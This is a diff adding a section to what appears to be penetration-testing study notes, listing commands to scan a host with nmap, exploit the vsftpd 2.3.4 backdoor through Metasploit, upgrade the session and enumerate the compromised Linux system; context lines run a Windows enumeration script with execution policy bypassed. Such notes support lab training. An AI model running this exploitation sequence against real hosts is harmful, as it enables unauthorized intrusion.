@@ -1888,3 +1888,37 @@ shell
 powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
 download JAWS-Enum.txt
 ```
+98) Enumerating System Information (Linux)
+
+```
+ifconfig
+nmap -sV 192.178.80.3
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.178.80.3
+run
+/bin/bash -i
+CTRL + Z
+sessions -u 1
+sessions 2
+sysinfo
+shell
+/bin/bash -i
+hostname
+cat /etc/issue
+cat /etc/*release
+uname -a
+lscpu
+df -h
+```
+
+
+
+
+
+
+
+
+
+
+
